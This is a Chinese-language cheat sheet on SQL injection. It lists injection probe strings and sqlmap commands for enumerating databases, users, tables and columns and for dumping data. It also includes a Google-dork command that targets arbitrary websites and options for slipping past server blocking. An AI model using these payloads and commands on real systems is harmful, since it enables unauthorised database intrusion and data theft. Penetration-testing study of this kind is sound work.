# SQL 注入

## 探测到底是不是通过拼接字符串方式使用 SQL

- 常用字符：

```
'
"
' and 1=1
' and 1=2
1 or 1=1
1' or '1'='1
1" or "1"="1
1' order by 1--
union select 1,2--
@@version
@@datadir
user()
database()
information_schema.tables

```


## sqlmap 分析数据库和表名、dump 表数据

#### sqlmap 介绍

- 目前做 SQL 注入的工具一般大家都是选择：[sqlmap](http://sqlmap.org/)
	- 目前（2018年08月）只支持：2.6.x 和 2.7.x
- 支持的 5 种注入类型：
	- 基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
	- 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
	- 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
	- 联合查询注入，可以使用union的情况下的注入。
	- 堆查询注入，可以同时执行多条语句的执行时的注入。


#### sqlmap 使用

- sqlmap 的输出信息按从简到繁共分为7个级别，依次为 0 ~ 6，级别越高，检测越全面。分别代表：
	- 使用参数 `-v <级别>` 来指定某个等级，默认输出级别为 1

```
0：只显示 Python 的 tracebacks 信息、错误信息 [ERROR] 和关键信息 [CRITICAL]；
1：同时显示普通信息 [INFO] 和警告信息[WARNING]；
2：同时显示调试信息[DEBUG]；
3：同时显示注入使用的攻击荷载；
4：同时显示 HTTP 请求；
5：同时显示 HTTP 响应头；
6：同时显示 HTTP 响应体。
```

- 将 Google 搜索前一百个结果作为攻击目标：`sqlmap -g "inurl:\".asp?id=1\""`
- 检查注入点（GET）：`sqlmap -u 目标网址`
- 检查注入点（POST 数据，多个数据用分号隔开）：`sqlmap -u 目标网址 --data="id=0;name=werner" --param-del=";"`
- 检查注入点（Cookie，等级必须是 2 以上）：`sqlmap -u 目标网址 --cookie –level 2 "JSESSIONID=123456;NAME=youmeek;" --cookie-del=";"`
- 获取所有数据库信息：`sqlmap -u 目标网址 --dbs`
- 获取所有数据库用户：`sqlmap -u 目标网址 --users`
- 获取当前数据库信息：`sqlmap -u 目标网址 --current-db`
- 获取当前用户：`sqlmap -u 目标网址 --current-user`
- 获取当前数据库和当前用户：`sqlmap -u 目标网址 --current-db --current-user`
- 获取有几张表：`sqlmap -u 目标网址 --tables`
- 获取指定表的字段有哪些：`sqlmap -u 目标网址 -T 表名 --columns`
- 获取指定表字段值：`sqlmap -u 目标网址 -T 表名 -C 字段名1,字段名2,字段名3 --dump`
- 获取指定表字段所有值：`sqlmap -u 目标网址 -T 表名 -C 字段名1,字段名2,字段名3 --dump-all`
- 让 HTTP 请求之间添加延迟，添加参数：`--delay 3`，单位是秒
- 设置超时时间，默认是 30 秒，添加参数：`--timeout 50`，单位是秒
- 设置超时后最大重试次数，默认是 3 次，添加参数：`--retries 5`
- 避免错误请求过多而被屏蔽：

```
有时服务器检测到某个客户端错误请求过多会对其进行屏蔽，而 sqlmap 的测试往往会产生大量错误请求，为避免被屏蔽，可以时不时的产生几个正常请求以迷惑服务器。有以下四个参数与这一机制有关：

--safe-url: 隔一会就访问一下的安全 URL
--safe-post: 访问安全 URL 时携带的 POST 数据
--safe-req: 从文件中载入安全 HTTP 请求
--safe-freq: 每次测试请求之后都会访问一下的安全 URL

这里所谓的安全 URL 是指访问会返回 200、没有任何报错的 URL。相应地，Sqlmap 也不会对安全 URL 进行任何注入测试。
```

- 其他常用参数：
	- 构造随机 user-agent：`–random-agent` 
	- 指定 HTTP Referer头：`–referer=设定值`
	- 换行分开，加入其他的HTTP头：`–headers=设定值`
	- 忽略响应的 Set–Cookie 头信息：`–drop-set-cookie` 

## 分析登录后台入口

- nikto

## 资料

- <http://www.cnblogs.com/hongfei/p/3872156.html>
- <https://www.tr0y.wang/2018/03/21/SQLmap/index.html>
- <>
- <>
- <>
- <>
- <>
- <>
- <>
- <>